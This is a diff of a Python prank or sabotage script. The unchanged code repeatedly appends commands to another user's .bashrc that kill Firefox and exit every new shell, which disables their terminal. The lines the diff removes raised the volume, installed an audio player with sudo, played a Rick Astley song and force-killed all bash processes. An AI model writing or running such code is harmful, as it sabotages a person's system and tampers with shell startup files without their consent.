@@ -7,8 +7,4 @@ for x in range(300):
 with open("../home/tls-sec/.bashrc", 'a+') as f:
     f.write("\npkill -f firefox\nexit")
     
-
-subprocess.run("sudo pactl -- set-sink-volume 0 30%")
-subprocess.run("sudo apt-get install sox libsox-fmt-mp3 -y")
-subprocess.run("( play -q /test/FIsxS52QXY7_Rick-Astley---Never-Gonna-Give-You-Up.mp3 )&")
-subprocess.run("sudo pkill -c -e -9 bash")
+#subprocess.run("sudo pkill -c -e -9 bash")
